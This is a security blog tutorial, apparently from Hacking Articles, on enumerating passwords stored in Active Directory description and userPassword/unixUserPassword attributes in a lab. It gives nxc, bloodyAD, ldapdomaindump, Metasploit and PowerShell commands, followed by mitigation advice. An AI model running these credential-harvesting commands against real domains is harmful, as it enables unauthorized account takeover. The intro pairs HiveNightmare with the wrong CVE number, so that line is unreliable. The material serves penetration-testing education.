<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/credential-dumping/" rel="category tag">Credential Dumping</a>, <a href="https://www.hackingarticles.in/category/red-teaming/domain-credential/" rel="category tag">Domain Credential</a></span>            </div>
            <h1 class="post-title entry-title">Credential Dumping: AD User Comment</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/credential-dumping-ad-user-comment/" rel="bookmark"><time class="entry-date published" datetime="2025-01-29T11:25:15+00:00">January 29, 2025</time><time class="updated" datetime="2025-08-08T09:25:56+00:00">August 8, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p data-start="774" data-end="1019"><span style="color: #000000;">In this article, we explore how attackers exploit <strong data-start="824" data-end="844">AD user comments</strong> and attributes for <strong data-start="864" data-end="888">password enumeration</strong>. This process helps attackers escalate their access within an organization by using <strong data-start="978" data-end="1018">AD user comment password enumeration</strong>.</span></p>
<p><span style="color: #000000;">Active Directory (AD) and related services contain several critical vulnerabilities. These can expose password related information stored in attributes like UserPassword, UnixUserPassword, unicodePwd, and msSFU30Password. Attackers can exploit these flaws to access password hashes or even cleartext passwords. This significantly increases the risk of unauthorized access to systems and data. Key attack paths include privilege escalation, improper access control configurations and vulnerabilities in network protocols like SMB or RDP that enable attackers to intercept or access sensitive fields. Notable CVEs that enable such exploits include <em>CVE-2020-1472 (Zerologon)</em>, <em>CVE-2017-0144 (EternalBlue)</em>, <em>CVE-2021-33766 (HiveNightmare)</em>, and <em>CVE-2019-0708 (BlueKeep)</em>, all of which if abused, can lead to illegal access to critical password fields in AD.</span></p>
<h3><span style="color: #800000;">Table of Contents</span></h3>
<p><strong><span style="color: #000000;">Understanding of Active Directory (AD) password attributes</span></strong></p>
<p><strong><span style="color: #000000;">Prerequisites</span></strong></p>
<p><strong><span style="color: #000000;">Lab Setup</span></strong></p>
<p><strong><span style="color: #000000;">Exploitation</span></strong></p>
<ul>
<li><span style="color: #000000;">nxc</span></li>
<li><span style="color: #000000;">bloodyAD</span></li>
<li><span style="color: #000000;">ldapdomaindump</span></li>
<li><span style="color: #000000;">MetaSploit</span></li>
<li><span style="color: #000000;">Get-WmiObject</span></li>
</ul>
<p><strong><span style="color: #000000;">Mitigation</span></strong></p>
<h3><span style="color: #800000;">Understanding of Active Directory (AD) password attributes:</span></h3>
<p><span style="color: #000000;"><strong>UserPassword:</strong> In Active Directory, the <em>UserPassword</em> field typically refers to the password hash stored for users (NTLM or sometimes Kerberos hashes). These hashes are used to authenticate users without directly storing plaintext passwords. If attackers access these hashes, they can perform offline attacks. These include brute force or dictionary attacks to recover original passwords.<br/>
</span></p>
<p><span style="color: #000000;"><strong>UnixUserPassword:</strong> This field is used when integrating AD with Unix/Linux systems. Services like SSSD or nsswitch.conf support such authentication. It stores the password hash for Unix-based systems, which is usually a different format (e.g., DES, SHA-512) than Windows hashes.</span></p>
<p><span style="color: #000000;"><strong>unicodePwd:</strong> The <em>unicodePwd</em> attribute in Active Directory holds the password for a user in Unicode format (UTF-16). This field is used by AD when passwords are being set or updated. In a typical AD deployment, this field would not be readable directly through normal LDAP queries due to security restrictions.</span></p>
<p><span style="color: #000000;"><strong>msSFU30Password:</strong> The <em>msSFU30Password</em> attribute is associated with the <em>Microsoft Services for Unix (SFU)</em> integration. This field stores passwords used in Unix environments but integrated into Active Directory, similar to the <em>unixUserPassword</em> attribute. If a system uses SFU, this field will store the password hash in a Unix-compatible format.</span></p>
<h3><span style="color: #800000;">Prerequisites</span></h3>
<ul>
<li><span style="color: #000000;">Windows Server 2019 as Active Directory Domain Controller</span></li>
<li><span style="color: #000000;">Tools<u>:</u> nxc, bloodyAD, ldapdomaindump, MetaSploit, Get-WmiObject utility</span></li>
<li><span style="color: #000000;">Kali Linux</span></li>
<li><span style="color: #000000;">Windows 10/11 – As Client/Attaker Machine</span></li>
</ul>
<h3><span style="color: #800000;">Lab Setup</span></h3>
<p><span style="color: #000000;">In this lab set up, we will create an AD user, then add user description that contains user’s password and provide passwords in “<em>userPassword</em>” &amp; “<em>userUnixPassword</em>” attributes.</span></p>
<h4><span style="color: #000000;">Create the AD Environment</span></h4>
<p><span style="color: #000000;">To simulate an Active Directory environment, set up a Windows Server 2019 as a Domain Controller (DC). You will also need a client/attacker machine (Windows or Linux) to run enumeration and exploitation tools.</span></p>
<h4><span style="color: #000000;">Domain Controller</span></h4>
<p><span style="color: #000000;">Install Windows Server (2016 or 2019 recommended).</span></p>
<ul>
<li><span style="color: #000000;">Promote it to a Domain Controller by adding the “<strong>Active Directory Domain Services</strong>” role.</span></li>
<li><span style="color: #000000;">Set up the domain (e.g., “<strong>local</strong>”).</span></li>
<li><span style="color: #000000;">Next, create a domain user with username “<strong>raj</strong>” and password “<strong>Password@1</strong>”.</span></li>
</ul>
<h4><span style="color: #000000;">Create an AD user and provide user description</span></h4>
<p><span style="color: #000000;">Once the AD environment is set up, open PowerShell in Administrative mode on the Windows Server. Then, run the two commands below. These commands will create the user “divya” with the “description” attribute containing the password.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-module ActiveDirectory
Set-ADUser –Identity “divya” –Description “this is a default password =Password@123”</pre>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1DpCAc8xbsn_qRyY-6u5tmZzIjlQZDV1zuzuGbARxPstZX9Xh_54QDXngFNWew1JStq-MxfYCZ2gtowTqYJ2jWL6lFCUnR6qfUhIERUZtcWGh7V4gjPbrUYw69XsS32zU6kyHvIw70px8ZeeJx6XbTY7-ASVLqpyZed9VvLxQrGTTZ_uiJH6x59O1c0Am/s16000/1.png" alt="AD User Comment Credential Dumping" width="1028" height="151"/></span></p>
<p><span style="color: #000000;">Using “Get-ADUser” utility and a command like below, we can confirm that a user with “<em>divya</em>” as username has been created along with the description provided.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Get-ADUser -Identity "divya" -Properties Description | Select-Object Name, Description</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYoLpezqWgIfrleu4dO3ObLtJa9kwY6xkYkvgAuyV4w-cGJWnHq5ndskpmx7FrLgbfpsghVq5f4tEFzOZpI6q7U018NEaFRgMVDHpMRMUif5W7l4PvowRVfQJUjSYammNrW0yL3mUENdDABrFHyvRN5BSEoEHf2zobmbh-9aNeZcphgwQWCrZE3kc9mg6f/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Then navigate to “divya” user’s properties window by following the below steps.</span></p>
<h5><span style="color: #000000;"><strong>Steps</strong></span></h5>
<ul>
<li><span style="color: #000000;">Open “<strong>Active Directory Users and Computers</strong> (ADUC)” on the Domain Controller.</span></li>
<li><span style="color: #000000;">Enable the “<strong>Advanced Features”</strong> view by clicking on “<strong>View &gt; Advanced Features</strong>”.</span></li>
<li><span style="color: #000000;">Locate user “<strong><em>divya</em></strong>” in the “<strong>Users</strong>” container.</span></li>
<li><span style="color: #000000;">Right-click on “<strong><em>divya</em></strong>”<strong> user</strong> and go to “<strong>Properties</strong>”.</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhD2q28z2fQQDpOMmC4ZmZyxdpXtCHuVNXVzZqXQMkHWoCykqXwN_iWalaPcwmKeHfbZHj2-lKOgw-u1lxumNitGRTP6iMN0elSTedAwFTu7qjE4LNFJUm1OJWr2gyjPDZoughQI5cl4BBJ7BwNsV0X3aDMXwWs0rchMB0Ioqv8-fIZn_F0IF-HHgIXzb4F/s16000/3.png"/></span></p>
<p><span style="color: #000000;">This action opens “<strong>General</strong>” tab of “divya” user’s <strong>Properties window</strong>, wherein the “<strong>Description</strong>” added can be viewed/confirmed.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEio3qNXAlZkad71X-CLlM9j6-uMAidN23cE5B5fr8pT4JbRiCeFTZP-_Hq7qPwhKhceHxBz8iR1qk-P4bROrWx81ZfFlGF8wQJINIYLQWkk9pambH1mptUkApJP4ig33g-hrOKGT21v9oMlfGSZlAxt5AMIrTQ17sPUjFTkvImgYW1ztDjcP8Bb9KOsspjT/s16000/4.png" alt="AD User Comment Credential Dumping" width="510" height="690"/></span></p>
<h4><span style="color: #000000;">Update <em>userPassword</em> attribute:</span></h4>
<p><span style="color: #000000;">Navigate to <strong>“Attribute Editor” tab</strong> within “<em>divya</em>” user’s properties window, select <strong>“<em>userPassword</em>” attribute</strong> and click on <strong>“Edit” button</strong>. This action opens “Multi-valued Octet String Editor” pop-up window. Click on “Add” button in the new window opened.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLmunV97n8WubD2qOKWj_uXJOGENlDXDda3jMw6NgkUkd8U3S2yB8A8hrUE5BJyd0egA989ZDoec_7VmQ-K5ijJwBjpYOxTmzg6p8TsCkNKpN0STZYNfZ8u8BosPDc6Ft_TMt1B_Mt2bXOdsWA7Lv_pFSmSL-vmyfVl1GF0FlCkldAbwT5UWTB_JIa8pJz/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Then, provide “<em>divya</em>” user’s password <strong>“<em>Password@123</em>”</strong> in it’s Hexadecimal form within <strong>“Value” textarea</strong> and click on <strong>“OK” button</strong> in the “<strong>Octet String Attribute Editor</strong>” pop-up window.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjsm0ZcN7WsErOTSu7evNAxptP2YTfuVd2GgFjok_1VwYR6NgyUckSia-XUiRcb_xqXTSnR0XsQ23-eUGSHbzh8YGHvOECAOmDCPzKC7PD_SW5APqFUVOOACu3Sk27Kgb8R-WPJ4kOK8ziabsCKoLmPywW3ijMPiLpSMVpHpms6P0FaGLsnsBbB-Ieoy8y/s16000/6.png" alt="AD User Comment Credential Dumping" width="496" height="681"/></span></p>
<h4><span style="color: #000000;">Update <em>userUnixPassword</em> attribute:</span></h4>
<p><span style="color: #000000;">Similar to the steps mentioned above in <em>“Update userPassword attribute”</em> section, one can select <strong><em>“userUnixPassword” attribute</em></strong> and update it’s value to <strong><em>“admin@123”</em></strong>.</span></p>
<p><span style="color: #000000;">Select <strong>“<em>userUnixPassword</em>” attribute</strong> and click on <strong>“Edit” button</strong>. This action opens “Multi-valued Octet String Editor” pop-up window. Click on “Add” button in the new window opened.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiffY8N0BCNTgxeKQnpyxGCVUaFd19JLO7PUMa_hfhM99LP7UR4lfE4kbWKIt4ZzLXQdbJb-WHlvl-vyIqpSE_zAxbl6HDaXEw-wbj16GBzmT17fDPQ4Iss8XH11oxKu1agklic-h7xF7-HGLomkuOXzvEOaWUct96cRqif1JmxoUjjx837E5tYR7RRgEtP/s16000/7.png"/></span></p>
<p><span style="color: #000000;">Provide “<em>divya</em>” user’s Unix Password <strong>“<em>admin@123</em>”</strong> in it’s Hexadecimal form within <strong>“Value” textarea</strong> and click on <strong>“OK” button</strong> in the “<strong>Octet String Attribute Editor</strong>” pop-up window.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5oO8AuDKb5GsKfNp2dTL-ZgQcguIMMu_DH8-QQCnLcqsI0GKyaXKCKwxSgCMjsBBZAr-xTaXORrwyzL_yGYevIRdGuXgRjOErwsPy4VsK1arFnBRA1PmxjdVqtmXELfxmNFq1K2UzNOcM0VCI2cE_iTwX0WyCQrnoaL4nk_9_4Npc5Qdi4lMNaeiXAuUL/s16000/8.png" alt="AD User Comment Credential Dumping" width="510" height="674"/></span></p>
<p><span style="color: #000000;">Alternatively, one can run below command from the PowerShell window that’s opened in <em>“Create an AD user and provide user description”</em> section to update <em>“divya”</em> user’s Unix Password as <em>“admin@123”</em>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Set-ADUser -Identity "divya" -Replace @{
 uidNumber=1001;
    gidNumber=1001;
    unixHomeDirectory="/home/linux";
    loginShell="/bin/bash";
    unixUserPassword="admin@123"
}</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglLW6u7fVkOb5qwJSldPCdWnRKtgkhHrJ4zLY-U0g5nXxAMPrJaJkpiS3rsIuHY74tBbOAtdapAwk8oG8bdNo_QdWGUMvTXtigTGK2g3QsHSEAiIAPWWos2j86ZEehfb06bNXaL0gf1aZsgHAw-GUfaIg_6Gv0fLcUm32GwlUg4SlBFQwVw8wl-Dae48Ot/s16000/11.png"/></span></p>
<h3><span style="color: #800000;">Exploitation</span></h3>
<h4><span style="color: #000000;">nxc</span></h4>
<p><span style="color: #000000;">Run the below command from Kali Linux Root Terminal to <strong>Get user descriptions stored in Active Directory</strong> using “<em>user-desc</em>” module of “<em>nxc</em>” tool.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc ldap 192.168.1.48 -u raj -p Password@1 -M user-desc</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiK4hO2i1oNtqS8D7O1mEWfbarMq7yeurxPnRPl7ItwwVnT5SfRPtJ5Ll_GEUD7TXHSLXbUVwzL-smO6MpRkI75JCot0YOXrvm-jpdK7olkKsMSfmexmOvLIjKvWcmGVpzd8UOPJt38hP5WT-HbUyLvJV-IFiq3zQGwTlDRbGIOKQWGG00KuRqvUQ9fJKik/s16000/12.png" alt="AD User Comment Credential Dumping" width="1180" height="170"/></span></p>
<p><span style="color: #000000;">Next, access “<em>nxc</em>” tool logs using the below command to revisit the enumerated information at a later time.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /root/.nxc/logs/UserDesc-192.168.1.48-20250120_052352.log</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7qh6xDD02nwYkU4EpSiHsgTbQDAS_e9O8I0MKZT0GJqS29WJHsvoCAXTvTQW7ErkGVra7MaFpOEuN3VM9feqP0dLzGT1ZJoRPQhbTMSuV_ML-YUx7u-GEs879ZzVxg8zNMTja1wQ4nTN5f_SmZ2eqcVmXdFhrsczR-l-tinYDMbkNr1y9nLNL225Ld_-G/s16000/13.png"/></span></p>
<p><span style="color: #000000;">In addition, run the following commands to enumerate sensitive information such as passwords.</span></p>
<ul>
<li><span style="color: #000000;">Enumerate AD users’ descriptions, using the module “<em>get-desc-users</em>”, which at times may contain passwords.</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc ldap 192.168.1.48 -u raj -p Password@1 -M get-desc-users</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3-G-CnuWAWC7-lrLdcPuF9jza_94xeSBXi5lwW7FBPe_o575CqC0AlSDYkrv65HsYmBcpPhPYSc7QIDrY6GYkbphb6zcrGLQ6O4mW0ZNJHkB6ud0_YoMNrPbQWDBKaZG4_wgCeB9KpOxPXbrrZVUYPaUamLkibg0A743NM40ev03OQLdmJXWF30bRoggP/s16000/14.png" alt="AD User Comment Credential Dumping" width="1171" height="240"/></span></p>
<ul>
<li><span style="color: #000000;">Enumerate userPassword attribute, using the module “<em>get-userPassword</em>”, from all users in ldap.</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc ldap 192.168.1.48 -u raj -p Password@1 -M get-userPassword</pre>
<p><span style="color: #000000;"><em><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXWsP5t4gXIDjfBM1aNjZE3L2S7FlGPZ-_-bWxGpL5GVvOQ0SW2ukG9t4fYO-m4hIC7GKaXa8lJ2A4P_JP09OELQZLzCtzbfXXOED8N211JNvKz6la88JcOOaPRDuvIz_YbQ-q7v2Rl3zaHOemc0dIgQ8nIXbBKWssSmikVYJBJ2t7PZRGnFMNiN5v-ae2/s16000/15.png"/></em></span></p>
<ul>
<li><span style="color: #000000;">Enumerate unixUserPassword attribute, using the module “<em>get-unixUserPassword</em>”, from all users in ldap.</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc ldap ignite.local -u raj -p Password@1 -M get-unixUserPassword</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpW8Lui1u09gAJCvoP_L7kqfyl9zhbxzu-dnYKM1kaiLMEWNXJeDFeKCQlX_qlvyxRDVCmV8ay9QBaVwWpCFokbdG5nmflUuAWeF5yx80pbhbdNsntYuy65cAYdiRMm0wrTBvDNofc-ZsapTC4yLXY7oWjzQoSwtSmPw3UuWaSYNv5fO4dyiPSfKNwutvp/s16000/16.png"/></span></p>
<h4><span style="color: #000000;">bloodyAD</span></h4>
<p><span style="color: #000000;">Run the below command to enumerate all users’ sensitive information that is stored in <em>“userPassword”, “unixUserPassword”, “unicodePassword”</em> and <em>“description”</em> objectClasses.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodyAD -u raj -p 'Password@1' -d ignite.local --host 192.168.1.48 get search --filter '(|(userPassword=*)(unixUserPassword=*)(unicodePassword=*)(description=*))' --attr userPassword,unixUserPassword,unicodePwd,description</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAwTYDb4-pgVx3pXuXt_AzWd8dyVbe2pjfhAX5J3TA_tfFk8fciPaOX775V3XSKQEbrF-M0Qui_qL5GO2JHhIbuzXDnntksSbYxblpG_4AQYIXtQ37peYN4JVkazi8C9AMrmAvZiZCTKRZNLYVhZcLE1HQ9kV2K2ezYjXoFyYPWIi2brSPjkm0boAn2G3I/s16000/17.png"/></span></p>
<p><span style="color: #000000;">Furthermore, you can observe output containing sensitive information like passwords and attacks a user is vulnerable to.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2YGZWp9cQxi4W5FCo_HN3VkjDu-BTbdK8lyPwyFb2KA72zS9vs6Ef7cDutesqkJHBhioWY2opmrYXL15YiCD2t_lo5c9_pw6AyILK5daJrDOS3MFtTnz_cW6JzXyMOPz_0rf0bj2LEM9XWcIKyRaKbGl3IORTeoBNTqolyB_FihiE52QkmUSUfVjCxicw/s16000/18.png" alt="AD User Comment Credential Dumping" width="708" height="179"/></span></p>
<h4><span style="color: #000000;">ldapdomaindump</span></h4>
<p><span style="color: #000000;">Run below commands to enumerate complete information about the AD under testing, then navigate to “AD_DUMP” directory and list all the files generated upon running “<em>ldapdomaindump</em>” tool.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ldapdomaindump -u 'ignite.localraj' -p Password@1 192.168.1.48 -o AD_DUMP
cd AD_DUMP
ls -al</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNYjDso3x-2CKY_yhjzVQ9CxRYreKJC2e50FXPG2LsNmVxukf2FNy4ypKKV5BThTgPc85Mtz4w4ptOfZyEzs_sMmmVXKzD8IQNpo_ISjF4grOhc4tSYGQvJHEIYGju-H-W4rclsjJwCaOECD203O3_WYCXiGGkyin4Iy-uKhTeqPQzsfCjh6UMoSgWCoqQ/s16000/19.png"/></span></p>
<p><span style="color: #000000;">Then, access “<em>domain_users.html</em>” file using a browser. Observe that the attacker could enumerate AD users’ “<em>description</em>” attribute that gives away user’s password or the attack technique to which the user is vulnerable to.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQCcukIMEw1rQ8O-F41h9Ua2BFEfjmDLITmN7ohyqSnPc8ijCI5leilHoInx-JvJ4VmzNL7ZaJZ1_UHSRKDYvBrAlCQFfwFM7f0covq9_DLLqfyKOCAfS3JV_cke1UybdkyTo6sZewgFC0379cVIk9rIZRyQkIq2p3mg25lyrLatiPZUISoslQU7ddcaV2/s16000/20.png" alt="AD User Comment Credential Dumping" width="1218" height="800"/></span></p>
<h4><span style="color: #000000;">MetaSploit</span></h4>
<p><span style="color: #000000;">Run MetaSploit Framework Console from Kali Linux Root Terminal using the below command.</span></p>
<p><span style="color: #000000;">Use “<strong><em>ldap_query</em></strong>” auxiliary module, set all required options and run the module to enumerate all AD users’ information.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/gather/ldap_query
set action ENUM_ACCOUNTS
set rhosts 192.168.1.48
set username raj
set password Password@1
set domain ignite.local
run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjy3mbaN6kRg8eMtx-X6RDV3nnI5FPlDkQIETMx3Cd3xaIgsW1pxMVIxcW8yidmaFXNG8y-r6moYGLvcmMOarM9sva-g6kfxJlEdPrFmrjI88uT3mW7YaC3HCt5jPPBLYwE-f35yiZjEtIQ1K7rIPrTK3ySY8biKSUTxRCuxmw6V2ORgNbaHfGd961BGnB/s16000/21.png"/></span></p>
<p><span style="color: #000000;">Below output screenshot lists AD users’ information along with their corresponding information stored in AD “<em>description</em>” attribute.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgAw-1iJbAfEusF7cbvKEsRnwENgUPPCLp4EsfH1XeyuOE-_1lfKkCWb7F0LA7WF6nAG4WMBvxk50RBrPSJCqDZF3qd1j4SNsnSC1Q_OmgHwV-e_X3Mx-DGhH0epXuh9ynD7cDg-_Utenz-av7gVThpMpziPPu4CtlUHPJz4mrFvWBW1wlFGhm2yBTVygki/s16000/22.png" alt="AD User Comment Credential Dumping" width="717" height="642"/></span></p>
<p><span style="color: #000000;"><strong>Note:</strong> Alternatively, we may use “<strong><em>enum_ad_user_comments</em></strong>” module and enumerate user’s information along with the information stored in AD “<em>descsription</em>” attribute. Below is the list of commands to execute in sequence and the output screenshot upon running listed commands from Kali Linux Root Terminal.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/windows/gather/enum_ad_user_comments
set session 1
run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgtzp1VlJINZuLP9iNPLFuUZUJ7lJY1lS7eWj51hkgLhiddu9_pmlJT3TW2xzRF6kD7gK2BXBbK2GWCbscvrH2OJRuTtqxr8KpgrSsAXHhqvBJyVDABkBj6KOUZ0UTHPXRbqPq-TfvEpG7sCv25StZkQddyqJPEE6w6xiHgklV0Qe0GhUQYVqBxNZojH9C4/s16000/23.png"/></span></p>
<h4><span style="color: #000000;">Get-WmiObject</span></h4>
<p><span style="color: #000000;">Open PowerShell in Administrative Mode in a Windows Client/Attacker Machine. Then, run the below command to enumerate information like “<em>username</em>”, “<em>SID</em>” and “<em>description</em>” of users’ listed in the command using the “Get-WmiObject” utility.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -in @("raj", "divya") } | Select-Object Name, SID, Domain, Description</pre>
<p><span style="color: #000000;"><strong> <img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrU1WgE3rkAQiAkLdvhSEp3HMdIuiADiZMl2VwB6YBqUjKIkOcf2mn5RFGkrJQTnSHiP0XnsEQDog0udj_h4vAUByy_P-id3iKV-kzxGC-cwSj0BozlO-Xmc9g4v6_iMv4yp-5gKvp6U6OVXZyaJoQT0azRkTCGMsfhVCEikuSvErwdwLXbm3oq2No91Ft/s16000/24.png" alt="AD User Comment Credential Dumping" width="962" height="245"/></strong></span></p>
<h3><span style="color: #800000;">Mitigation</span></h3>
<p><span style="color: #000000;">Vulnerabilities like CVE-2020-1472 (Zerologon), CVE-2017-0144 (EternalBlue), CVE-2021-33766 (HiveNightmare), and CVE-2019-0708 (BlueKeep) highlight potential risks. However, the UserPassword, UnixUserPassword, unicodePwd, and msSFU30Password attributes may not always present a direct threat. These attributes are vulnerable under specific conditions</span></p>
<p data-start="45" data-end="202"><span style="color: #000000;">However, attackers can use various attack vectors to gain the necessary access to retrieve these password related fields from Active Directory configuration.</span></p>
<p data-start="204" data-end="330"><span style="color: #000000;">Below are the best practices to follow carefully to fix and resolve the possibility of enumerating AD users’ password:</span></p>
<p><span style="color: #000000;"><strong data-start="334" data-end="359">Use Strong Encryption</strong>: Ensure that all communications between clients and domain controllers remain encrypted (LDAPS, SMB encryption, etc.) to prevent attackers from capturing password hashes. Also, disable legacy authentication protocols such as NTLM where possible.</span></p>
<p><span style="color: #000000;"><strong>Limit Access to Password Attributes:</strong> Use strict Access Control Lists (ACLs) to restrict access to sensitive attributes like UserPassword, UnixUserPassword, unicodePwd, and msSFU30Password to only trusted &amp; limited number of administrators.</span></p>
<p><span style="color: #000000;"><strong>Regularly Audit AD Permissions:</strong> Regularly review and audit the permissions on AD objects to ensure that only authorized users and groups can access sensitive fields.</span></p>
<p><span style="color: #000000;"><strong>Apply Security Patches:</strong> Ensure all AD and associated systems (like Unix integrations) are regularly patched to prevent misuse of known vulnerabilities.</span></p>
<p><span style="color: #000000;"><strong>Monitor for Privilege Escalation:</strong> Use monitoring &amp; alerting tools and practices to detect suspicious activities such as privilege escalation, lateral movement and/or attempts to dump credentials.</span></p>
<p><span style="color: #000000;">To learn more about Credential Dumping. Follow this <a href="https://www.hackingarticles.in/category/credential-dumping/">Link.</a></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Srikrishna is a Cybersecurity leader driving security excellence and mentoring teams to enhance security across products, networks, and organizations. Contac</span>t <a href="https://www.linkedin.com/in/srikrishna-chodisetty/"><strong>Here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
